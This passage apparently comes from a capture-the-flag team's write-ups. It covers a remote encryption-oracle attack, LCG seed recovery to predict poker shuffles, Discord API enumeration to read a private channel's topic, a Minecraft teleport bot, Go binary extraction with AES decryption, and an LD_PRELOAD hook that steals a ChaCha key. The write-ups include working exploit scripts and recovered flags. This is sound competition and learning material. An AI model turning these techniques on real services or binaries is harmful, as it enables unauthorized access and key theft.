    r.sendlineafter(b'> ',''.join(blocks[i:i+100]).encode())
    r.recvline()
    output += r.recvline().strip().decode()[:-8]
    r.close()

mappings = {}

assert len(output) % 8 == 0, "Encrypted output length should be a multiple of 8"
for i in range(0, len(output), 8):
    enc_chunk = output[i:i+8]            # 8-byte ciphertext block
    plain_idx = i // 2                   # maps to corresponding 4-byte plaintext start
    plain_chunk = payload[plain_idx:plain_idx+4]
    mappings[enc_chunk] = plain_chunk
   
r.close()

r = remote('28267ab8.ctf.ac.upt.ro', 9323)
r.sendlineafter(b'> ', b'1')
r.recvline()
flag_enc = r.recvline().strip().decode()
r.close()

assert len(flag_enc) % 8 == 0, "Encrypted flag length should be a multiple of 8"
decoded_blocks = []
for i in range(0, len(flag_enc), 8):
    c = flag_enc[i:i+8]
    decoded_blocks.append(mappings.get(c, '????'))

flag_dec = ''.join(decoded_blocks)
print(f'Flag: {flag_dec}')
```

But there's a problem: this code can't extract the whole flag. The output is: 
```
????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????F{0b3d4dd2dfa538c778f815b824da290e60ebc6d6116fcb94acc76a232fe811????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
```

We can spot the start 'F{...' and prepend 'CT', but how do we get the last block?

Consider what the last block contains: 4 characters, the first two are hex digits, then a closing curly bracket, and a random character (that's why the first script couldn't decode everything).

Based on this, we can brute-force the two hex characters and the last character, thus extracting the final flag block.

```python
for tup in trange(255):
    for i in trange(255):
        if not chr(i).isprintable(): continue
        brute = f"{tup:02x}" + "}" + chr(i)
        r = remote('28267ab8.ctf.ac.upt.ro', 9323)
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', brute.encode())
        r.recvline()
        output = r.recvline().strip().decode()
        r.close()
        if output[:8] in flag_enc:
            print(f"Found matching plaintext: {brute}")
            exit(0)
        else:
            if tup == 0:
                print(output[:8])
else:
    print("No matching 4-byte plaintext found in given alphabet.")
```

Which outputs -> **`e7}H`**

#### Script

```python
from itertools import product
from pwn import *
from tqdm import trange
context.log_level = 'critical'

alphabet = 'CTF{}' + '0123456789abcdef'

combs = product(alphabet, repeat=4)

payload = ''.join([''.join(c) for c in combs])

output = ''
blocks = [payload[i:i+4] for i in range(0, len(payload), 4)]
for i in trange(0, len(blocks), 100):
    r = remote('28267ab8.ctf.ac.upt.ro', 9323)
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ',''.join(blocks[i:i+100]).encode())
    r.recvline()
    output += r.recvline().strip().decode()[:-8]
    r.close()

mappings = {}

assert len(output) % 8 == 0, "Encrypted output length should be a multiple of 8"
for i in range(0, len(output), 8):
    enc_chunk = output[i:i+8]            # 8-byte ciphertext block
    plain_idx = i // 2                   # maps to corresponding 4-byte plaintext start
    plain_chunk = payload[plain_idx:plain_idx+4]
    mappings[enc_chunk] = plain_chunk
   
r.close()

r = remote('28267ab8.ctf.ac.upt.ro', 9323)
r.sendlineafter(b'> ', b'1')
r.recvline()
flag_enc = r.recvline().strip().decode()
r.close()

assert len(flag_enc) % 8 == 0, "Encrypted flag length should be a multiple of 8"
decoded_blocks = []
for i in range(0, len(flag_enc), 8):
    c = flag_enc[i:i+8]
    decoded_blocks.append(mappings.get(c, '????'))

flag_dec = ''.join(decoded_blocks)
print(f'Flag: {flag_dec}')
with open('flag.txt', 'w') as f:
    f.write(flag_dec + '\n')

for tup in trange(255):
    for i in trange(255):
        if not chr(i).isprintable(): continue
        brute = f"{tup:02x}" + "}" + chr(i)
        r = remote('28267ab8.ctf.ac.upt.ro', 9323)
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', brute.encode())
        r.recvline()
        output = r.recvline().strip().decode()
        r.close()
        if output[:8] in flag_enc:
            print(f"Found matching plaintext: {brute}")
            exit(0)
        else:
            if tup == 0:
                print(output[:8])
else:
    print("No matching 4-byte plaintext found in given alphabet.")
```

## Miscellaneous 🐧

### Full-House Poker

#### Analysis

The remote poker game shuffles the deck using a non-cryptographic linear congruential generator (LCG) with a 24‑bit seed and Fisher–Yates. By folding a few rounds to collect consecutive player hands, we can recover the seed (via a small time-window search or full 2^24 brute-force), reproduce future shuffles, and bet only when our predicted hand strictly beats the dealer. Beating the dealer 30 time gets the flag.

- PRNG: LCG with parameters A=1103515245, C=12345, M=2^31, seed truncated to 24 bits.
- Shuffle: Fisher Yates, advancing the PRNG once per swap (51 draws per round).
- Observation: Player receives the first 5 cards of the shuffled deck; dealer receives the next 5.
- Attack: Collect 4 consecutive hands while folding; recover seed; predict all future rounds; bet only on guaranteed wins; reach streak 30.

#### Solution

1) Data collection --> folding:
- Read the ASCII cards for 4 consecutive rounds (`HAND_SAMPLES = 4`).
- Always send `f` (fold) during this phase. This preserves the streak and ensures one shuffle per round without extra PRNG usage.

2) Recover the seed:
- Time-windowed search: the seed is derived created using `time.time()` modulo 2^24, I assumed the timestamp reflects the time at which I connected to the service. Start from `now & 0xFFFFFF` and try radii 10m, 1h, 6h, 24h (~600, ~3600, ~21600, ~86400 seconds). For each candidate seed, simulate `HAND_SAMPLES` shuffles and check that the top 5 cards match the observed player hands.
- Full brute-force fallback: if the time-window search fails, scan the entire 24-bit space (~16.7M seeds). This is still feasible with efficient Python and early rejection.

3) Predict and win:
- After recovering the seed, fast-forward the PRNG by performing `HAND_SAMPLES` shuffles to sync with the upcoming round.
- For each future round:
  - Simulate the next shuffle and extract the player’s and dealer’s 5-card hands (positions 0..4 and 5..9 of the shuffled deck).
  - Evaluate both hands using the same ranking as the server and compare.
  - Bet only if the player’s hand strictly beats the dealer’s; otherwise fold.
- Repeat until streak reaches 30; the server prints the flag.


#### Script

```python
from pwn import remote, context
import re
import sys
import time

context.log_level = 'info'

HOST = '?'
PORT = ?
MAX_SEED = 0xFFFFFF  # 24-bit
HAND_SAMPLES = 4      # number of initial hands to collect for seed filtering

RANK_ORDER = ['2','3','4','5','6','7','8','9','T','J','Q','K','A']
SUITS = ['♠','♥','♦','♣']
RANK_VALUE = {r: i+2 for i, r in enumerate(RANK_ORDER)}

# Build canonical ordered deck
def build_deck():
    return [(r,s) for r in RANK_ORDER for s in SUITS]

# LCG parameters (mod 2^31)
A = 1103515245
C = 12345
M = 1 << 31

def lcg_next(state):
    return (A * state + C) & 0x7fffffff

# Apply Fisher-Yates using LCG state; returns new state after 51 draws and deck
def shuffle_with_state(state):
    deck = build_deck()
    for i in range(len(deck)-1, 0, -1):
        state = lcg_next(state)
        j = state % (i+1)
        deck[i], deck[j] = deck[j], deck[i]
    return state, deck

# Hand evaluation (same tuples ordering as server)
def hand_strength(cards):
    ranks = sorted([RANK_VALUE[r] for (r, s) in cards], reverse=True)
    suits = [s for (r,s) in cards]
    counts = {}
    for rv in ranks:
        counts[rv] = counts.get(rv,0)+1
    by_count_then_rank = sorted(counts.items(), key=lambda kv: (kv[1], kv[0]), reverse=True)
    is_flush = len(set(suits)) == 1
    sorted_unique_desc = sorted(set(ranks), reverse=True)
    is_straight = False
    straight_high = None
    if len(sorted_unique_desc) == 5:
        top = sorted_unique_desc[0]
        if sorted_unique_desc == list(range(top, top-5, -1)):
            is_straight = True
            straight_high = top
        else:
            wheel = [14,5,4,3,2]
            if sorted_unique_desc == wheel:
                is_straight = True
                straight_high = 5
    counts_sorted = [c for (_,c) in by_count_then_rank]
    ranks_sorted_by_count = [r for (r,_) in by_count_then_rank]
    if counts_sorted[0] == 4:
        return (7, ranks_sorted_by_count[0], ranks_sorted_by_count[1])
    if counts_sorted[0] == 3 and counts_sorted[1] == 2:
        return (6, ranks_sorted_by_count[0], ranks_sorted_by_count[1])
    if is_flush and is_straight:
        return (8, straight_high)
    if is_flush:
        return (5, sorted(ranks, reverse=True))
    if is_straight:
        return (4, straight_high)
    if counts_sorted[0] == 3:
        trips_rank = ranks_sorted_by_count[0]
        kickers = sorted([r for r in ranks if r != trips_rank], reverse=True)
        return (3, trips_rank, kickers)
    if counts_sorted[0] == 2 and counts_sorted[1] == 2:
        high_pair = max(ranks_sorted_by_count[0], ranks_sorted_by_count[1])
        low_pair = min(ranks_sorted_by_count[0], ranks_sorted_by_count[1])
        kicker = [r for r in ranks if r != high_pair and r != low_pair][0]
        return (2, high_pair, low_pair, kicker)
    if counts_sorted[0] == 2:
        pair_rank = ranks_sorted_by_count[0]
        kickers = sorted([r for r in ranks if r != pair_rank], reverse=True)
        return (1, pair_rank, kickers)
    return (0, sorted(ranks, reverse=True))

def compare_hands(p1, p2):
    s1 = hand_strength(p1)
    s2 = hand_strength(p2)
    return (s1 > s2) - (s1 < s2)

CARD_WIDTH = 7
CARD_LINES = 7

def parse_hand(block):
    lines = block.strip('\n').split('\n')
    # Expect 7 lines of cards
    if len(lines) < CARD_LINES:
        raise ValueError('Unexpected hand block lines')
    line1 = lines[1]  # second line (index 1)
    line3 = lines[3]  # fourth line (index 3)
    parts1 = line1.split(' ')  # cards separated by space
    parts3 = line3.split(' ')
    cards = []

    card_regex_rank = re.compile(r'│(.{1,2})\s{3}│')
    card_regex_suit = re.compile(r'│\s{2}(.)\s{2}│')
    ranks = card_regex_rank.findall(line1)
    suits = card_regex_suit.findall(line3)
    if len(ranks) != len(suits):
        raise ValueError('Rank/suit count mismatch')
    for r,s in zip(ranks,suits):
        cards.append((r.strip(), s))
    return cards

HAND_HEADER = 'Your hand:'

def recv_until_hand(io):
    data = b''
    while True:
        chunk = io.recvuntil(b'Action? [b]et / [f]old > ', timeout=5)
        data += chunk
        text = data.decode(errors='ignore')
        # Extract portion between 'Your hand:' and the prompt
        if HAND_HEADER in text:
            # Get last occurrence
            idx = text.rfind(HAND_HEADER)
            after = text[idx+len(HAND_HEADER):]
            top_idx = after.find('┌')
            if top_idx == -1:
                continue
            hand_block = after[top_idx:]
            if 'Action? [b]et / [f]old >' in hand_block:
                hand_block = hand_block.split('Action? [b]et / [f]old >')[0]
            # Keep exactly 7 lines
            lines = hand_block.split('\n')[:CARD_LINES]
            hand_ascii = '\n'.join(lines)
            try:
                return parse_hand(hand_ascii)
            except Exception as e:
                context.log_level='debug'
                print('Parse error, retry:', e)
                context.log_level='info'
        # else keep waiting


def recover_seed(hands):
    candidates = []
    for seed in range(MAX_SEED+1):
        state = seed & 0xffffffff
        ok = True
        for target in hands:
            state, deck = shuffle_with_state(state)
            if deck[:5] != target:
                ok = False
                break
        if ok:
            candidates.append(seed)
            if len(candidates) == 1:
                break  # assume unique
    return candidates[0] if candidates else None


def recover_seed_time_window(hands, center, radius):
    total = 2*radius + 1
    for off in range(-radius, radius+1):
        seed = (center + off) & 0xFFFFFF
        state = seed & 0xffffffff
        ok = True
        for target in hands:
            state, deck = shuffle_with_state(state)
            if deck[:5] != target:
                ok = False
                break
        if ok:
            return seed
    return None


def predict_next(state):
    state, deck = shuffle_with_state(state)
    player = deck[:5]
    dealer = deck[5:10]
    return state, player, dealer


def main():
    io = remote(HOST, PORT)

    collected = []
    for i in range(HAND_SAMPLES):
        hand = recv_until_hand(io)
        print(f'[+] Round {i} observed player hand: {hand}')
        collected.append(hand)
        io.sendline(b'f')  # fold to preserve streak

    now_seed = int(time.time()) & 0xFFFFFF
    windows = [600, 3600, 6*3600, 24*3600]  # 10m, 1h, 6h, 24h
    seed = None
    start = time.time()
    for rad in windows:
        print(f'[*] Trying seed window +/-{rad}s around 0x{now_seed:06x}...')
        seed = recover_seed_time_window(collected, now_seed, rad)
        if seed is not None:
            break
    if seed is None:
        print('[*] Falling back to full 2^24 brute force; this may take time')
        seed = recover_seed(collected)
    elapsed = time.time() - start

    if seed is None:
        print('[-] Seed not found')
        io.interactive()
        return
    print(f'[+] Seed recovered: 0x{seed:06x} in {elapsed:.2f}s')

    state = seed & 0xffffffff
    for _ in range(HAND_SAMPLES):
        state, _deck = shuffle_with_state(state)

    streak = 0
    target_streak = 30
    round_idx = HAND_SAMPLES

    while streak < target_streak:
        state, predicted_player, predicted_dealer = predict_next(state)
        result = compare_hands(predicted_player, predicted_dealer)
        action = 'b' if result > 0 else 'f'
        print(f'[+] Predict round {round_idx}: player={predicted_player} dealer={predicted_dealer} -> result={result} action={action}')

        # Receive actual round hand
        actual = recv_until_hand(io)
        if actual != predicted_player:
            print('[-] Mismatch in prediction, abort.')
            io.interactive()
            return
        io.sendline(action.encode())

        if action == 'b':
            streak += 1
        print(f'[+] Current streak: {streak}')
        round_idx += 1

    io.interactive()

if __name__ == '__main__':
    main()

```

### Grass-Guesser

#### Analysis

The challenge was a funny "geoguesser" game where, from a simple grass image, you needed to find where that grass was in the world.
This would be impossible if it wasn't for the fact that the website, every time you got your answer wrong, told you how far you were from the real point and appended the name of the city or park that was involved.

##### Finding the coordinates

It was possible (as I did) to search the approximate coordinates of the place that the site was responding with and then try to adjust them in a way that the site liked better.

#### Solution

The solution is as simple as it seems; the only challenge was finding every single coordinate, which could probably be scripted, but I decided to do it myself.

After I was able to get every coordinate, I just sent them one by one to the server and get the flag
`CTF{53575e231bf06ed00182dcc71ef0e5d1b7d6da577d04ea08add31d8fbfd53722}`

#### Script

This is the actual script used in order to retrieve the flag from the remote

```python
import requests, json

url = '?'

s = requests.Session()

r = s.post(url+'api/start')

sessId = json.loads(r.text)['sessionId']

lats = [51.5074,48.8566,40.7829,-33.8688,35.6762,52.5200,41.8902,37.7750,55.7558,1.2897]
longs = [-0.1278,2.3521,-73.9654,151.2093,139.6503,13.4051,12.4923,-122.4194,37.6173,103.8501]

for i in range(10):
    r = s.post(url+'api/guess', json={'sessionId': sessId, 'lat': lats[i%len(lats)], 'lng': longs[i%len(longs)]})
    
print(json.loads(r.text)['flag'])
```

### Discord Sanity Check 

#### Analysis
The challenge didn't provide any kind of attachments and the only hint was its description:

`Hope you liked our original discord challenge. Now we have a better one :D`

Obviusly the only discord server that had to be analyzed was the CTFs one that had the guild id `1358683641097621596`.

Once done that the flow to find the flag was easy and followed this steps:

+ Open discord browser and get in the right server
+ Edit using burp / firefox developer network manager an API request.

Once done that I could effectevly analyse the server since I guessed that there weren't any kind of interaction necessary to find the flag.
Thus I opened the [`discord API references`](https://discord.com/developers/docs/resources/guild) and started analyzing the guild.

+ Make an API request to `https://discord.com/api/v9/guilds/1358683641097621596`, here I found nothing really interesting a side from some roles I haven't seen before.
+ Make an API request to see all the channels (some of them might be hidden but still share some kind of information, that's how discord work according to some documents online) `https://discord.com/api/v9/guilds/1358683641097621596/channels`

Using the last request I was able to find the flag hidden in the topic of a private channel ![screenshot of the API response](/images/discord_sanity.png)

### Stairway To Heaven

#### Analysis

The challenge literally told everyone that a staircase in the venue had some "piece of cloth" atteched to, we wondered around for a minute and then right after find this flag.

![photo of the staircase](/images/staircases.png)

### Love at first bit

#### Analysis

Aside from yapping for quite a long time about a story, the challenge asked to find where this photo was taken:

![Challenge attachment](/images/idk_what_this_is.png)

This was a strange question for a misc challenge, especially because the description itself didn't provide any useful data to find the location.

Thus we treated the image as a steganography challenge and analyzed it using [`aperisolve`](https://www.aperisolve.com/).

We found the flag in the zsteg analysis as `b1,rgb,lsb,xy`.

![aperisolve screenshot](/images/aperisolve.png)

With that, we solved the challenge and obtained the flag `CTF{Palazzo Falson}`.

## Reverse engineering ⚙️

### Minecrafty as a Service

#### Analysis

The attachment `main.wasm` is a Minecraft server compiled to WebAssembly (WASM). After joining the server, we can see two available commands: `!help` and `!flag`. When running `!flag`, the server replies with something like: `To get the flag, run this command at position UwU`. This implies we must find the exact position at which to run `!flag`, as defined in `main.wasm`.

To locate the handler for the command, I searched for a function with `chat` in its name. I found `github.com_go_mc_server_game.__globalChat_.Handle`, which at address 0x808c1d77 contains the handler for the `!flag` command. Analyzing this handler shows that the player's current position must be exactly (35246, 35246, 35246) for the flag to be printed.

```c
// After matching "!flag"
int X = (int) truncS(player.posX);
int Y = (int) truncS(player.posY);
int Z = (int) truncS(player.posZ);

// 0x89ae == 35246
if (X != 0x89ae) goto fail;
if (Y != 0x89ae) goto fail;
if (Z == 0x89ae) goto success;   // all three must be 35246
else goto fail;
```

#### Solution

Knowing this, we need to move to the coordinates (35246, 35246, 35246). To do that, I reused the solution from the Minecraft challenge in the quals and changed the target position. 

#### Script

```js
#!/usr/bin/env node
const mineflayer = require('mineflayer')
const { Vec3 } = require('vec3')

function parseArgs () {
  const args = { host: '127.0.0.1', port: 25565, name: 'Flaggy', version: '1.19.4' }
  for (let i = 2; i < process.argv.length; i++) {
    const a = process.argv[i]
    if (a === '--host') args.host = process.argv[++i]
    else if (a === '--port') args.port = parseInt(process.argv[++i], 10)
    else if (a === '--name') args.name = process.argv[++i]
    else if (a === '--version') args.version = process.argv[++i]
  }
  return args
}

const TARGET = new Vec3(35246, 35246, 35246)
const MAX_STEP = 50

function stepTowards (cur, dst, maxStep) {
  const dx = dst.x - cur.x
  const dy = dst.y - cur.y
  const dz = dst.z - cur.z
  const dist = Math.sqrt(dx * dx + dy * dy + dz * dz)
  if (dist === 0) return cur
  if (dist <= maxStep) return new Vec3(dst.x, dst.y, dst.z)
  const s = maxStep / dist
  return new Vec3(cur.x + dx * s, cur.y + dy * s, cur.z + dz * s)
}

async function main () {
  const { host, port, name, version } = parseArgs()
  console.log('[INIT] Config:', { host, port, name, version })
  const createOpts = { host, port, username: name, auth: 'offline' }
  if (version && version.toLowerCase() !== 'auto') createOpts.version = version
  else console.log('[INIT] Version: auto')
  const bot = mineflayer.createBot(createOpts)

  bot.once('login', () => {
    console.log('[STATE] Logged in, waiting for spawn...')
  })
  bot.once('kicked', (reason) => {
    console.error('[STATE] Kicked:', reason?.toString?.() || reason)
  })
  bot.once('error', (err) => {
    console.error('[STATE] Error:', err)
  })
  bot.once('end', () => {
    console.log('[STATE] Disconnected')
  })

  bot.on('message', (cm) => {
    try {
      const s = cm.toString()
      console.log('[CHAT]', s)
      if (s.includes('ctf{')) {
        console.log(s)
        bot.end()
        process.exit(0)
      }
    } catch (_) {}
  })

  let movementStarted = false
  let movementState = null
  let teleportReady = true
  function startMovement (reason) {
    if (movementStarted) return
    movementStarted = true
    const start = bot.entity.position.clone()
    console.log(`[STATE] Starting movement (${reason}) at`, {
      x: start.x.toFixed(2), y: start.y.toFixed(2), z: start.z.toFixed(2)
    })

    if (bot.creative && bot.creative.startFlying) {
      try { bot.creative.startFlying(); console.log('[ACTION] Start flying') } catch (_) {}
    }

    let cur = start
    let moving = true
    let stepCount = 0
    const interval = 200
    const dist = (a, b) => Math.sqrt((a.x - b.x) ** 2 + (a.y - b.y) ** 2 + (a.z - b.z) ** 2)
    console.log('[MOVE] Target:', { x: TARGET.x, y: TARGET.y, z: TARGET.z })
    console.log('[MOVE] Initial distance:', dist(cur, TARGET).toFixed(2), 'blocks')

    movementState = { cur, moving, stepCount, interval }

    const timer = setInterval(() => {
      if (!movementState.moving) return
      const next = stepTowards(movementState.cur, TARGET, MAX_STEP)
      const stepLen = dist(movementState.cur, next)
      const remainBefore = dist(movementState.cur, TARGET)
      movementState.cur = next
      movementState.stepCount++
      console.log(`[MOVE] step ${movementState.stepCount} -> (${next.x.toFixed(2)}, ${next.y.toFixed(2)}, ${next.z.toFixed(2)}) ` +
                  `(step=${stepLen.toFixed(2)} rem=${Math.max(0, remainBefore - stepLen).toFixed(2)})`)
      try {
        bot._client.write('position', { x: next.x, y: next.y, z: next.z, onGround: true })
      } catch (e1) {
        try {
          bot._client.write('position_look', { x: next.x, y: next.y, z: next.z, yaw: 0, pitch: 0, onGround: true })
        } catch (e2) {
          console.error('[NET] Move send failed:', e2?.message || e2)
        }
      }

      if (next.equals(TARGET)) {
        movementState.moving = false
        clearInterval(timer)
        console.log('[MOVE] Arrived at target. Requesting flag...')
        setTimeout(() => {
          console.log('[CHAT] >> !flag')
          bot.chat('!flag')
        }, 500)
      }
    }, interval)
  }

  bot.once('spawn', () => startMovement('spawn'))

  bot.once('login', () => {
    setTimeout(() => {
      if (!movementStarted) {
        console.log('[WARN] Spawn not seen after 5s; starting anyway...')
        startMovement('timeout')
      }
    }, 5000)
  })

  let debugCount = 0
  bot._client.on('packet', (data, meta) => {
    if (debugCount < 10) {
      console.log('[PKT]', meta.name)
      debugCount++
    }
    if (meta.name === 'player_position_and_look' || meta.name === 'position' || meta.name === 'position_look' || meta.name === 'player_position') {
      const hasTeleportId = typeof data.teleportId === 'number'
      if (hasTeleportId) {
        try {
          bot._client.write('teleport_confirm', { teleportId: data.teleportId })
          console.log('[NET] Confirmed teleport id', data.teleportId)
        } catch (e) {
          console.log('[NET] Teleport confirm write failed:', e?.message || e)
        }
        teleportReady = true
      }
      const hasXYZ = typeof data.x === 'number' && typeof data.y === 'number' && typeof data.z === 'number'
      if (hasXYZ && movementState) {
        movementState.cur = new Vec3(data.x, data.y, data.z)
        console.log('[SYNC] Cur pos updated from server packet')
      }
      if (!movementStarted) startMovement('server-position')
    }
  })
}

main().catch((e) => {
  console.error(e)
  process.exit(1)
})
```

> N.B.: This exploit is practically the same of [`the original Minecrafty`](https://pascalctf.github.io/en/ctf/ctfatac/#minecrafty)

### Volatile

#### Analysis

While analyzing the file I understood that this was a binary written in GO where the function `main.main` at `0x5309e0` builded an `afero.MemMapFs` over an embedded file table and reading two paths (`unk_5BCEE4` -> `e/f1`, `unk_5BCEE8` -> `e/f2`) via `github_com_spf13_afero_ReadFile`. The table itself is a `[]internal/embed/file` slice at `0x604360`, whose header (`ptr=0x604378, len=3`) points at three entries: directory `e/`, and files `e/f1` and `e/f2`. Each entry stores the Go string pointer/length for both the path and the file data, so dumping the strings at those addresses recovers the payloads. `e/f1` turned out to be the literal 32-byte ASCII string `6b90408b52818c16e4e3fd2e8acb40d6`, while `e/f2` held a 128-byte base64 ciphertext beginning with `RLJwwmLd1PETlctb...PlPGI`.

While continuing to analyze the `main.main` function I understood that it called `encoding/base64.StdEncoding.DecodeString` on `e/f2`, taking the first 16 decoded bytes as an IV, and decrypting the remainder with `crypto/aes.NewCipher` + `cipher.NewCBCDecrypter` using the raw bytes from `e/f1`. The plaintext was then written to `/uwu/flag.txt`, so recreating that routine offline reproduces the flag without needing to run the target binary.

#### Solution

1. I used `extract_embed_fs.py` to parse the slice at `0x604360` and dump `extracted/e/f1` and `extracted/e/f2` straight from `.rodata`. The script converts the virtual addresses to file offsets using the `.rodata` base (`0x56b000`) observed in IDA, so no manual hex-editing is required:
   ```bash
   cd Downloads
   python extract_embed_fs.py
   ```
2. I decrypted `e/f2` with the AES-CBC flow mirrored from `main.main`. `decrypt_flag.py` base64-decodes the blob, splits IV+ciphertext, decrypts, PKCS#7-unpads, prints the plaintext, and drops it where the binary would have been (`uwu/flag.txt`):
   ```bash
   python decrypt_flag.py
   ```

Thus providing the right flag as the binary would have.

#### Scripts

##### Extract Embed FS

```python
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import struct
from pathlib import Path


RODATA_VADDR = 0x56B000
RODATA_FOFFSET = 0x16B000
FILE_SLICE_ADDR = 0x604360
FILE_ENTRY_SIZE = 48  # sizeof(string) + sizeof(string) + 16-byte hash


def vaddr_to_offset(vaddr: int) -> int:
   if vaddr < RODATA_VADDR:
      raise ValueError(f"virtual address 0x{vaddr:x} is outside .rodata")
   return RODATA_FOFFSET + (vaddr - RODATA_VADDR)


def read_slice_header(blob: bytes) -> tuple[int, int, int]:
   if len(blob) != 24:
      raise ValueError("expected 24-byte slice header")
   return struct.unpack("<QQQ", blob)


def read_string(fh, ptr: int, length: int) -> str:
   fh.seek(vaddr_to_offset(ptr))
   return fh.read(length).decode("utf-8")


def read_bytes(fh, ptr: int, length: int) -> bytes:
   fh.seek(vaddr_to_offset(ptr))
   return fh.read(length)


def parse_entries(binary: Path) -> list[tuple[str, bytes]]:
   entries: list[tuple[str, bytes]] = []
   with binary.open("rb") as fh:
      fh.seek(vaddr_to_offset(FILE_SLICE_ADDR))
      ptr, length, capacity = read_slice_header(fh.read(24))
      if length != capacity:
         raise ValueError("embed.FS file table length mismatch")

      table_off = vaddr_to_offset(ptr)
      for idx in range(length):
         fh.seek(table_off + idx * FILE_ENTRY_SIZE)
         chunk = fh.read(FILE_ENTRY_SIZE)
         path_ptr, path_len = struct.unpack_from("<QQ", chunk, 0)
         data_ptr, data_len = struct.unpack_from("<QQ", chunk, 16)

         path = read_string(fh, path_ptr, path_len)
         data = b""
         if data_len:
            data = read_bytes(fh, data_ptr, data_len)
         entries.append((path, data))
   return entries


def main():
   parser = argparse.ArgumentParser(description=__doc__)
   parser.add_argument(
      "--binary",
      default="volatile",
      type=Path,
      help="path to the Go binary (default: ./volatile)",
   )
   parser.add_argument(
      "--outdir",
      default=Path("extracted"),
      type=Path,
      help="directory for extracted payloads (default: ./extracted)",
   )
   args = parser.parse_args()

   args.outdir.mkdir(parents=True, exist_ok=True)
   entries = parse_entries(args.binary)

   for path, data in entries:
      if not data:
         continue
      out_path = args.outdir / path
      out_path.parent.mkdir(parents=True, exist_ok=True)
      out_path.write_bytes(data)
      print(f"Wrote {len(data):4d} bytes -> {out_path}")


if __name__ == "__main__":
   main()
```

##### Decrypt file

```python
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import base64
from pathlib import Path

from Crypto.Cipher import AES


def read(path: Path) -> bytes:
   data = path.read_bytes()
   if not data:
      raise ValueError(f"{path} is empty")
   return data


def unpad(block: bytes) -> bytes:
   pad_len = block[-1]
   if pad_len == 0 or pad_len > len(block):
      raise ValueError("invalid padding")
   if block[-pad_len:] != bytes([pad_len]) * pad_len:
      raise ValueError("padding bytes mismatch")
   return block[:-pad_len]


def main() -> None:
   parser = argparse.ArgumentParser(description=__doc__)
   parser.add_argument(
      "--key",
      default=Path("extracted/e/f1"),
      type=Path,
      help="path to e/f1 (the raw 32-byte AES key)",
   )
   parser.add_argument(
      "--blob",
      default=Path("extracted/e/f2"),
      type=Path,
      help="path to e/f2 (base64 IV+ciphertext blob)",
   )
   parser.add_argument(
      "--out",
      default=Path("uwu/flag.txt"),
      type=Path,
      help="output path for the recovered flag (default: uwu/flag.txt)",
   )
   args = parser.parse_args()

   key = read(args.key)
   blob = base64.b64decode(read(args.blob))
   iv, ciphertext = blob[:16], blob[16:]
   aes = AES.new(key, AES.MODE_CBC, iv)
   plaintext = unpad(aes.decrypt(ciphertext))

   args.out.parent.mkdir(parents=True, exist_ok=True)
   args.out.write_bytes(plaintext)
   print(plaintext.decode())
   print(f"Flag written to {args.out}")


if __name__ == "__main__":
   main()
```

### IronVeil

#### Analysis

We received a stripped ELF64 binary (`ironveil`) and an encrypted blob (`flag.txt.encrypted`). Running the binary encrypts any named file and emits an `IRONVEIL_ENC_V3` container:

* `00..0f`: `"IRONVEIL_ENC_V3\0"`
* `10..1b`: 12-byte nonce
* `1c..end-10`: ciphertext
* `last 16`: Poly1305 tag
  (Plaintext length = total size - 44 bytes.)

Static recon (main at `0xfb60`) showed heavy hardening: poll/stack checks, a per-thread VM, and `ChaCha20-Poly1305`. Strings near `0x59c8a` ("Key derived using VM program with 101 opcodes") imply the key is computed on the fly. The pipeline is driven by `sub_9F20`, which feeds an AVX ChaCha core (`sub_1B4A0`) using the `"expand 32-byte k"` constant at `0x572c0`.

Naive ideas failed:

* Hashing the file mtime (`Fri, 07 Nov 2025 23:35:40 GMT`) doesn't reproduce the key; the VM mixes extra hidden state.
* `LD_PRELOAD` memcpy/sniffer hooks dump lots of memory but the program zeroes buffers before printing.
* Snapshots catch only zeroes because the key lives in registers most of the time.

Key observation: right before calling the ChaCha block, `sub_9F20` briefly spills the 32-byte key to its stack at `[rsp+0xa0]`. That window is enough to steal it.

#### Solution

We used an `LD_PRELOAD` helper to hot-patch the binary and intercept that spill:

1. Locate PIE base via `/proc/self/maps`.
2. Overwrite the instruction at `PIE+0xd758` with `movabs rax,<hook>; call rax`, temporarily replacing the original `movl $0,0xc0(%rsp)`.
3. In a naked hook stub, copy 32 bytes from `[rsp+0xa0]` to a global buffer, replay the displaced instruction, and `ret`.
4. A lightweight `write()` hook prints the key once when it sees the "Key derived using ..." line.

Running any encryption through the preloader yields:

```
[keyhook] base=0x559fe85f3000
[keyhook] derived key 7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95
File encrypted successfully: sample.txt.encrypted
Key derived using VM program with 101 opcodes
```

With the 32-byte ChaCha key in hand, decryption is straightforward: parse the format, extract nonce/ciphertext/tag, and run `ChaCha20-Poly1305` with empty AAD.

#### Script

Build and run the preloader to exfiltrate the key:

```bash
cd ironveil_lab
gcc -shared -fPIC keyhook.c -o keyhook.so -ldl
LD_PRELOAD=$PWD/keyhook.so ./ironveil sample.txt
```

Decrypt `flag.txt.encrypted` offline:

```python
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

key = bytes.fromhex("7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95")
blob = Path("flag.txt.encrypted").read_bytes()
nonce, ct, tag = blob[16:28], blob[28:-16], blob[-16:]
flag = ChaCha20Poly1305(key).decrypt(nonce, ct + tag, b"")
print(flag.decode())
```

## Hardware 🔌

### Arducan

#### Analysis

The firmware `sketch.elf` exposes a textual CAN ECU accessible over TCP: it accepts frames formatted as
`CAN_ID:LEN:BYTE0,BYTE1,...` and implements a small state machine gated by an authentication step. The high‑level
flow is: perform a diagnostic handshake, request a 32‑bit challenge, compute and send a deterministic response,
